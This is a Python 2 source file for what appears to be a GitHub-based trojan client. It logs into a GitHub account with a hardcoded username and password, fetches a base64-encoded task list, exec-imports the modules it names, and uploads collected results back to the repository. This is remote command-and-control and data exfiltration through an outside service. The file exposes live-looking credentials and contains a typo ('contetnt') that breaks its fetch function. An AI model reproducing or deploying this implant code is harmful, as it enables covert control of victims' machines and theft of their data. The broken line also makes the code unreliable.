import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

unt_id = "abc"

unt_config = "%s.json" % unt_id
data_path = "data/%s/" % unt_id
unt_mod = []
task_queue = Queue.Queue()
confed = False


def conn_to_git():
    gh = login(username="Kosma789", password="mio7aw6lms")
    repo = gh.repo("Kosma789", "unt1")
    branch = repo.branch("master")

    return gh, repo, branch


def get_file_cont(filepath):

    gh, repo, branch = conn_to_git()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "found: %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.contetnt

    return None


def get_unt_conf():
    global confed
    config_json = get_file_cont(unt_config)
    config = json.loads(base64.b64decode(config_json))
    confed = True

    for task in config:
        if task['module'] not in sys.modules:
            exec ("import %s" % task['module'])

    return config


def store_modules_result(data):
    gh, repo, branch = conn_to_git()
    remote_path = "data/%s/%d.data" % (unt_id, random.randint(1000, 10000))
    repo.create_file(remote_path, "confirmed", base64.b64encode(data))


